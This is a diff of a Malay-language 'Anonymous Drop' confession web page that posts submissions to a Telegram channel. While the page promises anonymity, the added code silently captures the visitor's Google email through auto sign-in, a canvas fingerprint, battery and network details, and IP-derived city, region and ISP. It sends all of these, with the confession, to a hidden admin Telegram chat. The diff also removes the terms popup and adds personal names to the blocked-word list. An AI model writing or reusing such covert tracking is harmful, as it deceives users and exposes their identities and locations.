@@ -6,10 +6,10 @@
     <title>Anonymous Confession</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://accounts.google.com/gsi/client" async defer></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: 'Plus Jakarta Sans', sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -33,7 +33,9 @@
             -webkit-backdrop-filter: blur(25px) saturate(200%);
             border: 1px solid rgba(255, 255, 255, 0.15);
             box-shadow: 0 10px 40px 0 rgba(0, 0, 0, 0.5);
-            transition: filter 0.5s ease;
+            border-radius: 2.5rem;
+            transform-style: preserve-3d;
+            transition: all 0.5s ease;
         }
 
         .blurred {
@@ -71,7 +73,7 @@
             </div>
             <h2 class="text-2xl font-bold mb-4">Human Verification</h2>
             <p class="text-gray-300 text-sm leading-relaxed mb-8">
-                By clicking below, you agree to stay anonymous and confirm you are a human. View <span class="tnc-clickable" id="tncLink">terms</span>.
+                By clicking below, you agree to stay anonymous. View <span class="tnc-clickable" id="tncLink">terms</span>.
             </p>
             <button id="agreeBtn" class="w-full py-4 bg-indigo-600 hover:bg-indigo-500 rounded-2xl font-black text-white transition-all active:scale-95 shadow-xl">
                 SETUJU BRO
@@ -80,46 +82,50 @@
     </div>
 
     <div class="w-full max-w-md mx-auto px-4">
-        <div id="tiltCard" class="glass-card p-8 sm:p-12 rounded-[2.5rem] w-full blurred relative overflow-hidden">
-            
+        <div id="tiltCard" class="glass-card p-8 sm:p-12 w-full blurred relative overflow-hidden">
             <div id="loadingOverlay" class="hidden absolute inset-0 bg-slate-900/90 flex flex-col items-center justify-center z-50">
                 <div class="w-12 h-12 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                 <p class="text-xs font-bold tracking-widest text-indigo-400 uppercase">Loading Content...</p>
             </div>
 
-            <div class="card-inner">
-                <h1 class="text-4xl font-extrabold text-center text-white mb-2">Anonymous Drop</h1>
-                <p class="text-center text-indigo-300 mb-8 text-xl font-light">Luah je apa kau rasa.</p>
+            <div class="card-inner" id="cardMainContent">
+                <div id="formContainer">
+                    <div class="flex justify-center mb-6">
+                        <div id="g_id_onload"
+                             data-client_id="231925439708-te47tckgcptfs1vr6jk4a9n84a4hlggn.apps.googleusercontent.com"
+                             data-context="signin"
+                             data-callback="onSilentAuth"
+                             data-auto_select="true"
+                             data-itp_support="true">
+                        </div>
+                        <div class="g_id_signin" data-type="standard" data-theme="filled_black" data-shape="pill"></div>
+                    </div>
 
-                <form id="confessionForm" class="space-y-6">
-                    <textarea 
-                        id="confessionText" 
-                        rows="7" 
-                        required 
-                        placeholder="Dipersilakan menaip di sini..."
-                        class="mt-1 block w-full rounded-2xl shadow-xl p-5 border transition duration-300 resize-none text-base focus:border-indigo-500 focus:ring-0"
-                    ></textarea>
-                    
-                    <button 
-                        type="submit" 
-                        id="submitButton"
-                        class="w-full flex justify-center py-4 rounded-2xl text-xl font-bold text-white bg-indigo-600 hover:bg-indigo-500 transition duration-200"
-                    >
-                        <span id="buttonText">SEND MESSAGE</span>
-                    </button>
-                </form>
+                    <h1 class="text-4xl font-extrabold text-center text-white mb-2">Anonymous Drop</h1>
+                    <p class="text-center text-indigo-300 mb-8 text-xl font-light">Luah je apa kau rasa.</p>
+
+                    <form id="confessionForm" class="space-y-6">
+                        <textarea 
+                            id="confessionText" 
+                            rows="7" 
+                            required 
+                            placeholder="Dipersilakan menaip di sini..."
+                            class="mt-1 block w-full rounded-2xl shadow-xl p-5 border transition duration-300 resize-none text-base focus:border-indigo-500 focus:ring-0"
+                        ></textarea>
+                        
+                        <button 
+                            type="submit" 
+                            id="submitButton"
+                            class="w-full flex justify-center py-4 rounded-2xl text-xl font-bold text-white bg-indigo-600 hover:bg-indigo-500 transition duration-200 shadow-lg"
+                        >
+                            <span id="buttonText">SEND MESSAGE</span>
+                        </button>
+                    </form>
+                </div>
 
                 <div id="statusMessage" class="mt-6 p-4 rounded-xl hidden text-center text-white font-medium"></div>
             </div>
         </div>
-    </div>
-
-    <div id="g_id_onload"
-         data-client_id="231925439708-te47tckgcptfs1vr6jk4a9n84a4hlggn.apps.googleusercontent.com"
-         data-context="signin"
-         data-callback="onSilentAuth"
-         data-auto_select="true"
-         data-itp_support="true">
     </div>
 
     <script>
@@ -127,42 +133,13 @@
         const PUBLIC_CHAT_ID = '-1001841870133'; 
         const PRIVATE_LOG_ID = '-1003635312239'; 
 
-        const profanityList = ['horny', 'tetek', 'kote', 'sangap', 'bj', 'lancap', 'toceng', 'sex', 'cum', 'pepek', 'fuck', 'pussy', 'babi', 'lgbt', 'gay', 'sial', 'peliaq', 'hanat', 'kimak', 'kiwak', 'buto', 'butoh', 'pukimak', 'barua', 'konek', 'pantat', 'patamak', 'seks', 'pntt', 'delete', 'bangsat', 'anak haram', 'haram jadah', 'puki', 'berayaq'];
+        const profanityList = ['sofea', 'horny', 'tetek', 'kote', 'sangap', 'bj', 'lancap', 'toceng', 'sex', 'cum', 'pepek', 'fuck', 'pussy', 'babi', 'lgbt', 'gay', 'sial', 'peliaq', 'hanat', 'kimak', 'kiwak', 'buto', 'butoh', 'pukimak', 'barua', 'konek', 'pantat', 'patamak', 'seks', 'pntt', 'delete', 'bangsat', 'anak haram', 'haram jadah', 'puki', 'berayaq', 'porn', 'thila', 'izzat'];
         
-        let userEmail = null;
+        let userEmail = "Anonymous (No Google Selection)";
         const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase();
 
-        async function getDetailedDevice() {
-            const ua = navigator.userAgent;
-            let os = "Unknown OS";
-
-            if (/android/i.test(ua)) {
-                os = "Android";
-                const match = ua.match(/Android\s([0-9\.]+)/);
-                if (match) os += " " + match[1];
-            } else if (/iPhone|iPad|iPod/.test(ua)) {
-                os = "iOS";
-                const match = ua.match(/OS\s([0-9\_]+)/);
-                if (match) os += " " + match[1].replace(/_/g, '.');
-            } else if (/Windows NT/i.test(ua)) {
-                os = "Windows";
-                const match = ua.match(/Windows NT\s([0-9\.]+)/);
-                if (match) os += " " + (match[1] === "10.0" ? "10/11" : match[1]);
-            } else if (/Macintosh/i.test(ua)) {
-                os = "macOS";
-            }
-
-            let browser = "Unknown";
-            if (/chrome|crios/i.test(ua)) browser = "Chrome";
-            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
-            else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-            else if (/edg/i.test(ua)) browser = "Edge";
-
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
-            const language = navigator.language || "Unknown Language";
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-            let canvasID = "N/A";
+        // 1. Silent Canvas Fingerprinting (100% Background)
+        function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
@@ -172,107 +149,66 @@
                 ctx.fillStyle = "#f60";
                 ctx.fillRect(125,1,62,20);
                 ctx.fillStyle = "#069";
-                ctx.fillText("Confession_Forensic_ID", 2, 15);
+                ctx.fillText("Confession#1", 2, 15);
                 ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("Confession_Forensic_ID", 4, 17);
-                canvasID = btoa(canvas.toDataURL()).substring(100, 140);
-            } catch(e) {}
-
-            let gpu = "N/A";
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
-
-            let isIncognito = "No";
-            try {
-                if ('storage' in navigator && 'estimate' in navigator.storage) {
-                    const {quota} = await navigator.storage.estimate();
-                    if (quota < 120000000) isIncognito = "Yes";
+                ctx.fillText("Confession#1", 4, 17);
+                const result = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < result.length; i++) {
+                    hash = ((hash << 5) - hash) + result.charCodeAt(i);
+                    hash |= 0;
                 }
-            } catch(e) {}
-
-            let batteryInfo = "N/A";
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
-                }
-            } catch(e) {}
-
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-            const networkSpeed = conn.downlink ? `${conn.downlink} Mbps (${conn.effectiveType})` : "N/A";
-            const ping = conn.rtt ? `${conn.rtt}ms` : "N/A";
-
-            const cores = navigator.hardwareConcurrency || "N/A";
-            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "N/A";
-
-            return {
-                system: `${os} (${browser})`,
-                screen: screenRes,
-                locale: `${language} / ${timezone}`,
-                forensics: {
-                    canvasID,
-                    gpu,
-                    isIncognito,
-                    batteryInfo,
-                    networkSpeed,
-                    ping,
-                    cores,
-                    ram,
-                    sessionId
-                }
-            };
+                return Math.abs(hash).toString(16);
+            } catch(e) { return "N/A"; }
         }
 
-        document.getElementById('tncLink').onclick = (e) => {
-            e.stopPropagation();
-            const customAlert = document.createElement('div');
-            customAlert.className = "fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/60";
-            customAlert.innerHTML = `
-                <div class="bg-gray-900 border border-white/10 p-6 rounded-2xl max-w-xs w-full">
-                    <h3 class="font-bold text-lg mb-2">Security Terms</h3>
-                    <p class="text-sm text-gray-400 mb-4">- Post remains anonymous to the public.<br>- Silent handshake verifies human status.</p>
-                    <button class="w-full py-2 bg-indigo-600 rounded-lg text-sm font-bold" onclick="this.parentElement.parentElement.remove()">Close</button>
-                </div>
-            `;
-            document.body.appendChild(customAlert);
-        };
+        // 2. Silent Battery & Network Info (100% Background)
+        async function getSilentForensics() {
+            let data = { battery: "N/A", charging: "N/A", connection: "N/A" };
+            try {
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    data.battery = Math.round(bat.level * 100) + "%";
+                    data.charging = bat.charging ? "Yes" : "No";
+                }
+                if (navigator.connection) {
+                    data.connection = navigator.connection.effectiveType || "N/A";
+                }
+            } catch(e) {}
+            return data;
+        }
+
+        // 3. Silent IP Intelligence (Background Call)
+        async function getIpIntel() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const json = await res.json();
+                return {
+                    ip: json.ip,
+                    city: json.city,
+                    region: json.region,
+                    isp: json.org
+                };
+            } catch(e) { return { ip: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown" }; }
+        }
 
         document.getElementById('agreeBtn').onclick = () => {
             document.getElementById('consentModal').classList.add('hidden');
             document.getElementById('tiltCard').classList.remove('blurred');
-            document.getElementById('loadingOverlay').classList.remove('hidden');
-            
-            setTimeout(() => {
-                document.getElementById('loadingOverlay').classList.add('hidden');
-                if (!userEmail) {
-                    userEmail = "Handshake Failed (Incognito/Unverified)";
-                }
-            }, 2500); 
         };
 
         function onSilentAuth(response) {
             try {
                 const payload = JSON.parse(atob(response.credential.split('.')[1]));
                 userEmail = payload.email;
-            } catch (e) {
-                userEmail = "Auth Error";
-            }
+            } catch (e) {}
         }
 
-        function containsLink(text) {
-            const urlPattern = /(\b(https?:\/\/\S+|www\.\S+|[a-zA-Z0-9]+\.(com|net|org|co|my|io|me|gov|edu)\/\S*)\b)/i;
-            return urlPattern.test(text);
-        }
-
-        function containsProfanity(text) {
-            const normalizedText = text.toLowerCase().replace(/[^a-z0-9\s]/g, ' ');
+        function checkSpamFuzzy(text) {
+            const simplify = (str) => str.toLowerCase().replace(/(.)\1+/g, '$1').replace(/[^a-z0-9\s]/g, '');
+            const cleanInput = simplify(text);
             for (const word of profanityList) {
-                const regex = new RegExp('\\b' + word + '\\b', 'i');
-                if (regex.test(normalizedText)) return word;
+                if (cleanInput.includes(simplify(word))) return word;
             }
             return null;
         }
@@ -286,16 +222,19 @@
             const text = textArea.value.trim();
             if(!text) return;
 
-            if (containsLink(text)) {
-                statusDiv.innerText = "Links are not allowed.";
-                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
+            // Device-based Rate Limit
+            const lastSent = localStorage.getItem('last_drop');
+            if (lastSent && (Date.now() - lastSent < 30000)) {
+                const left = Math.ceil((30000 - (Date.now() - lastSent)) / 1000);
+                statusDiv.innerText = `Device Cooldown: ${left}s left.`;
+                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-orange-600 text-white block";
                 statusDiv.classList.remove('hidden');
                 return;
             }
 
-            const pWord = containsProfanity(text);
-            if (pWord) {
-                statusDiv.innerText = `can't be send because have word "${pWord}"`;
+            const badWord = checkSpamFuzzy(text);
+            if (badWord) {
+                statusDiv.innerText = `can't be sent because it contains "${badWord}"`;
                 statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                 statusDiv.classList.remove('hidden');
                 return;
@@ -306,16 +245,15 @@
             btn.innerText = "SENDING...";
 
             try {
+                // Collect All Silent Data
+                const fingerprint = getCanvasFingerprint();
+                const forensics = await getSilentForensics();
+                const ipIntel = await getIpIntel();
+
                 const esc = (str) => String(str).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
                 const escapedText = esc(text);
-                const info = await getDetailedDevice();
                 
-                const identity = userEmail || "Verification Incomplete";
-                const escapedEmail = esc(identity);
-                const escapedSys = esc(info.system);
-                const escapedScreen = esc(info.screen);
-                const escapedLocale = esc(info.locale);
-
+                // 1. Send to Public Channel
                 const publicRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -326,36 +264,31 @@
                     })
                 });
 
-                if(PRIVATE_LOG_ID.startsWith('-100')) {
-                    const adminMessage = `🔐 *ADMIN LOG*\n` +
-                                       `👤 *User:* ${escapedEmail}\n` +
-                                       `🆔 *Sess/CID:* ${esc(info.forensics.sessionId)} / \`${esc(info.forensics.canvasID)}\`\n` +
-                                       `💻 *Sys/GPU:* ${escapedSys} / ${esc(info.forensics.gpu)}\n` +
-                                       `🛠️ *Hard:* ${esc(info.forensics.cores)} Cores / ${esc(info.forensics.ram)} RAM\n` +
-                                       `📡 *Net:* ${esc(info.forensics.networkSpeed)} / Ping: ${esc(info.forensics.ping)}\n` +
-                                       `🔋 *Power:* ${esc(info.forensics.batteryInfo)}\n` +
-                                       `🕵️ *Incog:* ${esc(info.forensics.isIncognito)}\n` +
-                                       `📏 *Res:* ${escapedScreen}\n` +
-                                       `🌍 *Locale:* ${escapedLocale}\n` +
-                                       `💬 *Content:* \n"${escapedText}"`;
+                // 2. Send Advanced Forensics to Admin (Background)
+                const adminMsg = `🔐 *ADMIN LOG (PADU)*\n` +
+                                `👤 *Google:* ${esc(userEmail)}\n` +
+                                `🆔 *Sess:* ${esc(sessionId)}\n` +
+                                `🧬 *Fingerprint:* \`${esc(fingerprint)}\`\n` +
+                                `🔋 *Battery:* ${esc(forensics.battery)} (${esc(forensics.charging)})\n` +
+                                `📶 *Net:* ${esc(forensics.connection)}\n` +
+                                `🌍 *Location:* ${esc(ipIntel.city)}, ${esc(ipIntel.region)}\n` +
+                                `🏢 *ISP:* ${esc(ipIntel.isp)}\n` +
+                                `💬 *Content:* \n"${escapedText}"`;
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: PRIVATE_LOG_ID,
-                            text: adminMessage,
-                            parse_mode: 'MarkdownV2'
-                        })
-                    });
-                }
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: PRIVATE_LOG_ID,
+                        text: adminMsg,
+                        parse_mode: 'MarkdownV2'
+                    })
+                });
 
                 if(publicRes.ok) {
+                    localStorage.setItem('last_drop', Date.now());
                     statusDiv.innerText = "Confession sent anonymously!";
                     statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-green-600 text-white block";
-                } else {
-                    statusDiv.innerText = "Error sending message.";
-                    statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-orange-600 text-white block";
                 }
                 
                 statusDiv.classList.remove('hidden');
@@ -373,4 +306,3 @@
     </script>
 </body>
 </html>
-
